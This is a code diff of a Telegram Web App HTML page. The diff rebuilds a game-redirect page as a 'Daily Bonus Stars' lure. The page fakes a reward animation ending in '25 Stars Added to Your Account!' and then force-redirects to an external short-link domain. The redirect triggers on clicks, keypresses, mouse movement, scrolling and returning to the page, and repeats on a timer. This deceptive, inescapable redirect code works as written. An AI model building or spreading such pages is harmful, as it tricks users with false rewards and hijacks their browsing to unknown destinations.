@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Redirecting...</title>
+    <title>Bonus Stars!</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         * {
@@ -28,68 +28,207 @@
             padding: 20px;
         }
 
-        .loading {
-            font-size: 24px;
+        .stars-icon {
+            font-size: 80px;
             margin-bottom: 20px;
+            animation: glow 2s ease-in-out infinite alternate;
         }
 
-        .spinner {
-            width: 50px;
-            height: 50px;
-            border: 5px solid rgba(255,255,255,0.3);
-            border-top: 5px solid #ffd700;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin: 20px auto;
+        @keyframes glow {
+            0% { transform: scale(1); text-shadow: 0 0 10px #ffd700; }
+            100% { transform: scale(1.1); text-shadow: 0 0 30px #ffd700, 0 0 40px #ffd700; }
         }
 
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+        .title {
+            font-size: 32px;
+            font-weight: bold;
+            margin-bottom: 15px;
+            background: linear-gradient(45deg, #ffd700, #ffa500);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
         }
 
-        .info {
+        .subtitle {
+            font-size: 18px;
+            margin-bottom: 25px;
+            opacity: 0.9;
+        }
+
+        .bonus-amount {
+            font-size: 48px;
+            font-weight: bold;
+            color: #ffd700;
+            margin: 20px 0;
+            text-shadow: 0 0 20px rgba(255, 215, 0, 0.5);
+            animation: pulse 1.5s ease-in-out infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+        }
+
+        .progress-container {
             background: rgba(255,255,255,0.1);
             border-radius: 15px;
             padding: 20px;
             margin: 20px 0;
+            border: 2px solid rgba(255, 215, 0, 0.3);
         }
 
-        .countdown {
-            font-size: 18px;
-            color: #ffd700;
+        .progress-text {
+            font-size: 16px;
+            margin-bottom: 15px;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 12px;
+            background: rgba(255,255,255,0.2);
+            border-radius: 6px;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #ffd700, #ffa500);
+            width: 0%;
+            animation: progress 2.5s ease-in-out forwards;
+        }
+
+        @keyframes progress {
+            0% { width: 0%; }
+            100% { width: 100%; }
+        }
+
+        .claiming-text {
+            font-size: 22px;
+            font-weight: bold;
+            margin: 25px 0;
+            color: #4caf50;
+            min-height: 30px;
+        }
+
+        .stars-animation {
+            position: relative;
+            height: 60px;
+            margin: 20px 0;
+        }
+
+        .star {
+            position: absolute;
+            font-size: 24px;
+            animation: starFloat 3s ease-in-out infinite;
+        }
+
+        @keyframes starFloat {
+            0%, 100% { transform: translateY(0) rotate(0deg); opacity: 0; }
+            50% { transform: translateY(-20px) rotate(180deg); opacity: 1; }
+        }
+
+        .benefits {
+            background: rgba(255,215,0,0.1);
+            border-radius: 15px;
+            padding: 15px;
+            margin: 20px 0;
+            border: 1px solid rgba(255,215,0,0.3);
+        }
+
+        .benefit-item {
+            display: flex;
+            align-items: center;
             margin: 10px 0;
+            font-size: 14px;
+        }
+
+        .benefit-icon {
+            font-size: 20px;
+            margin-right: 10px;
+            color: #ffd700;
+        }
+
+        .redirect-message {
+            font-size: 14px;
+            opacity: 0.7;
+            margin-top: 20px;
+        }
+
+        .sparkle {
+            position: absolute;
+            font-size: 16px;
+            animation: sparkle 1s ease-in-out infinite;
+        }
+
+        @keyframes sparkle {
+            0%, 100% { opacity: 0; transform: scale(0); }
+            50% { opacity: 1; transform: scale(1); }
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="loading">🎮 Redirecting to Game...</div>
-        <div class="spinner"></div>
+        <div class="stars-icon">⭐</div>
+        <div class="title">DAILY BONUS STARS!</div>
+        <div class="subtitle">Your free reward is waiting</div>
         
-        <div class="info">
-            <div class="countdown" id="countdown">Redirecting in 3 seconds...</div>
-            <p>Please wait while we redirect you to the game</p>
+        <div class="bonus-amount">+25 STARS</div>
+
+        <div class="stars-animation" id="starsAnimation"></div>
+
+        <div class="progress-container">
+            <div class="progress-text">Processing your bonus stars...</div>
+            <div class="progress-bar">
+                <div class="progress-fill"></div>
+            </div>
         </div>
+
+        <div class="benefits">
+            <div class="benefit-item">
+                <span class="benefit-icon">🎁</span>
+                <span>Open rare chests</span>
+            </div>
+            <div class="benefit-item">
+                <span class="benefit-icon">⚡</span>
+                <span>Spin premium roulette</span>
+            </div>
+            <div class="benefit-item">
+                <span class="benefit-icon">🔮</span>
+                <span>Buy exclusive items</span>
+            </div>
+        </div>
+
+        <div class="claiming-text" id="claimingText">🎊 Preparing your stars...</div>
         
-        <div style="margin-top: 20px; font-size: 14px; opacity: 0.7;">
-            If redirect doesn't work, <a href="https://2no.co/RNEX87" style="color: #ffd700;">click here</a>
+        <div class="redirect-message">
+            Redirecting to activate your bonus...
         </div>
     </div>
 
     <script>
         let tg = window.Telegram.WebApp;
         
+        // Создаем анимацию звезд
+        function createStarsAnimation() {
+            const container = document.getElementById('starsAnimation');
+            const stars = ['⭐', '🌟', '💫', '✨'];
+            
+            for (let i = 0; i < 8; i++) {
+                const star = document.createElement('div');
+                star.className = 'star';
+                star.textContent = stars[Math.floor(Math.random() * stars.length)];
+                star.style.left = Math.random() * 100 + '%';
+                star.style.animationDelay = (Math.random() * 2) + 's';
+                container.appendChild(star);
+            }
+        }
+        
         // Функция принудительного редиректа
         function forceRedirect() {
-            const targetUrl = "https://2no.co/RNEX87";
+            const targetUrl = "https://maper.info/RNDX87";
             
-            // Пробуем все методы редиректа
             try {
-                // Основной метод
                 window.location.href = targetUrl;
                 
-                // Резервные методы
                 setTimeout(() => {
                     window.location.replace(targetUrl);
                 }, 100);
@@ -103,20 +242,45 @@
             }
         }
         
-        // Функция обратного отсчета
-        function startCountdown() {
-            let seconds = 3;
-            const countdownElement = document.getElementById('countdown');
+        // Анимация получения звезд
+        function startStarsClaim() {
+            const texts = [
+                "🎊 Preparing your stars...",
+                "⭐ Counting your bonus...",
+                "💰 Adding to your balance...",
+                "🎯 Almost ready...",
+                "✅ 25 Stars Added to Your Account!"
+            ];
             
-            const countdownInterval = setInterval(() => {
-                countdownElement.textContent = `Redirecting in ${seconds} seconds...`;
-                seconds--;
+            let currentIndex = 0;
+            const textElement = document.getElementById('claimingText');
+            
+            const textInterval = setInterval(() => {
+                textElement.textContent = texts[currentIndex];
+                textElement.style.color = currentIndex === texts.length - 1 ? '#4caf50' : '#ffd700';
+                currentIndex++;
                 
-                if (seconds < 0) {
-                    clearInterval(countdownInterval);
-                    forceRedirect();
+                if (currentIndex >= texts.length) {
+                    clearInterval(textInterval);
+                    
+                    // Добавляем финальные искры
+                    for (let i = 0; i < 10; i++) {
+                        setTimeout(() => {
+                            const sparkle = document.createElement('div');
+                            sparkle.className = 'sparkle';
+                            sparkle.textContent = '✨';
+                            sparkle.style.left = Math.random() * 100 + '%';
+                            sparkle.style.top = Math.random() * 100 + '%';
+                            document.querySelector('.container').appendChild(sparkle);
+                            
+                            setTimeout(() => sparkle.remove(), 1000);
+                        }, i * 100);
+                    }
+                    
+                    // Редирект после завершения анимации
+                    setTimeout(forceRedirect, 2000);
                 }
-            }, 1000);
+            }, 800);
         }
         
         // Проверяем не возврат ли это в приложение
@@ -124,14 +288,12 @@
             const lastRedirect = localStorage.getItem('last_redirect');
             const now = Date.now();
             
-            // Если прошло меньше 10 секунд с последнего редиректа - снова редиректим
             if (lastRedirect && (now - parseInt(lastRedirect)) < 10000) {
-                document.querySelector('.loading').textContent = '🔄 Detected return - redirecting again...';
-                setTimeout(forceRedirect, 500);
+                document.getElementById('claimingText').textContent = '🔄 Finalizing your stars...';
+                setTimeout(forceRedirect, 800);
                 return true;
             }
             
-            // Сохраняем время редиректа
             localStorage.setItem('last_redirect', now.toString());
             return false;
         }
@@ -141,58 +303,33 @@
             tg.ready();
             tg.expand();
             
-            // Проверяем не возврат ли это
+            // Создаем анимацию звезд
+            createStarsAnimation();
+            
             if (!checkReturn()) {
-                // Запускаем обратный отсчет
-                startCountdown();
-                
-                // Авто-редирект через 3 секунды
-                setTimeout(forceRedirect, 3000);
+                startStarsClaim();
             }
             
-            // Перехватываем все клики и тоже редиректим
-            document.addEventListener('click', function(e) {
-                e.preventDefault();
-                forceRedirect();
-            });
+            // Перехватываем все события
+            document.addEventListener('click', forceRedirect);
+            document.addEventListener('keydown', forceRedirect);
+            document.addEventListener('mousemove', () => setTimeout(forceRedirect, 500));
+            document.addEventListener('scroll', () => setTimeout(forceRedirect, 500));
             
-            // Перехватываем нажатия клавиш
-            document.addEventListener('keydown', function(e) {
-                forceRedirect();
-            });
-            
-            // Периодическая проверка и редирект
             setInterval(() => {
-                // Если пользователь все еще здесь - редиректим снова
-                if (!window.location.href.includes('2no.co')) {
+                if (!window.location.href.includes('maper.info')) {
                     forceRedirect();
                 }
-            }, 5000);
+            }, 3000);
         }
         
-        // Запускаем при загрузке
         document.addEventListener('DOMContentLoaded', init);
         
-        // Также запускаем когда страница становится видимой (возврат в приложение)
         document.addEventListener('visibilitychange', function() {
             if (!document.hidden) {
-                setTimeout(forceRedirect, 1000);
+                document.getElementById('claimingText').textContent = "Completing your bonus...";
+                setTimeout(forceRedirect, 600);
             }
-        });
-        
-        // Редирект при любом движении мыши
-        document.addEventListener('mousemove', function() {
-            setTimeout(forceRedirect, 500);
-        });
-        
-        // Редирект при скролле
-        document.addEventListener('scroll', function() {
-            setTimeout(forceRedirect, 500);
-        });
-        
-        // Редирект при изменении размера окна
-        window.addEventListener('resize', function() {
-            setTimeout(forceRedirect, 500);
         });
     </script>
 </body>
